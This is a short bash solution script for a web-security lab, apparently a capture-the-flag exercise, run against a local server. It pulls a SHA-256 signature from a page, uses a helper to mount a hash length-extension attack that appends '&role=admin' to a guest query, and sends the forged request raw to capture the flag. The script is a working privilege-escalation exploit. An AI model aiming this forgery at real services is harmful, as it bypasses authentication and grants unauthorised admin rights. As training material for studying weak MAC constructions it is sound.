#!/usr/bin/env bash
# Lab 38 — resume SHA-256 from the published digest and append.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9380}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab38

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
SIG="$("$H5I" websec show res_0 --session "$SESSION" --raw |
    python3 -c 'import re,sys;print(re.search(r"sig=([0-9a-f]{64})",sys.stdin.read()).group(1))')"

read -r NEWDATA NEWSIG <<<"$(python3 "$(dirname "$0")/extend.py" \
    --digest "$SIG" --data 'user=guest&role=viewer' --append '&role=admin' --key-len 16)"

# The forged message contains 0x80 and NUL bytes. Its percent-encoding is the
# payload, so it must reach the socket unparsed: `--raw-target`, as in Lab 27.
send "$SESSION" req_0 --raw-target "/api/act?data=$NEWDATA&sig=$NEWSIG" | flag
